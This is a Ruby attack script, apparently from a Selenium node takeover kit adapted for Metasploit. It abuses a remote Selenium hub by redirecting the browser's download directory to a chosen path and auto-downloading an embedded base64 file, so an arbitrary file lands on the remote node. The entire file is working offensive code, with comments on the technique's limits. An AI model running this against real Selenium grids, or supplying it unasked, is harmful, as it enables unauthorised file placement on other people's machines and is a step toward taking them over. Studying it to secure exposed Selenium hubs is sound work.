#!/usr/bin/env ruby
# https://github.com/JonStratton/selenium-node-takeover-kit/blob/master/examples/selenium_node_upload.rb
#
# You can upload a file onto a remote selenium node by changing the download folder and clicking a download link.
# Small files can be encoded and used within url inline html. Larger files should be pulled remotely.
# Limits are 1. the context of the process on the selenium node, 2. it cannot overwrite files, and 3. it doesnt seem to be able to make dot files.
#
# Converted to Ruby for metasploit module

require 'selenium-webdriver'
require 'base64'
require 'optparse'

options = {}
OptionParser.new do |opts|
  opts.banner = 'Usage: example.rb [options]'
  opts.on('-hURL', '--hubURL', 'Selenium Hub URL') do |h|
    options[:hub] = h
  end
  opts.on('-rFILE', '--remoteFILE', 'The destination of the uploaded files.') do |r|
    options[:remote] = r
  end
  opts.on('-lFILE', '--localFILE', 'The (small) local to upload.') do |l|
    options[:local] = l
  end
  opts.on('-bBROWSER', '--dataBROWSER', 'firefox or chrome.') do |b|
    options[:browser] = b
  end
  opts.on('--help', 'Prints this help') do
    puts opts
    exit
  end
end.parse!

hub_url = options[:hub]
remote_file = options[:remote]
local_file = options[:local]
browser = options[:browser]

# Inline html with an inline download file link
url_file = 'data:application/octet-stream;charset=utf-16le;base64,%s' % [Base64.encode64( File.read(local_file) )]
data_url = 'data:text/html;charset=utf-8,<html><a id=f href="%s" download="%s">f</a></html>' % [url_file, File::basename(remote_file)]

capabilities = {}
if browser == 'chrome'
  capabilities = Selenium::WebDriver::Remote::Capabilities.chrome(
    "chromeOptions" => {
      'prefs' => {
        'profile.default_content_settings.popups' => 0,
        'download.default_directory' => File::dirname(remote_file),
        'download.prompt_for_download' => false,
      }
    }
  )
else
   # Configure browser profile to use custom download location and not prompt to save files for mime type.
  profile = Selenium::WebDriver::Firefox::Profile.new
  profile['browser.download.folderList'] = 2
  profile['browser.download.manager.showWhenStarting'] = false
  profile['browser.download.dir'] = File::dirname(remote_file)
  profile['browser.helperApps.neverAsk.saveToDisk'] = 'application/octet-stream;'
  capabilities = Selenium::WebDriver::Remote::Capabilities.firefox(:firefox_profile => profile)
end

driver = Selenium::WebDriver.for :remote, :url => hub_url, :desired_capabilities => capabilities

# Load the data URL and click the download link
driver.navigate.to(data_url)
driver.find_element(:id, 'f').click

if browser == 'chrome' # Not sure why this is needed
  sleep(5)
end
driver.quit

exit
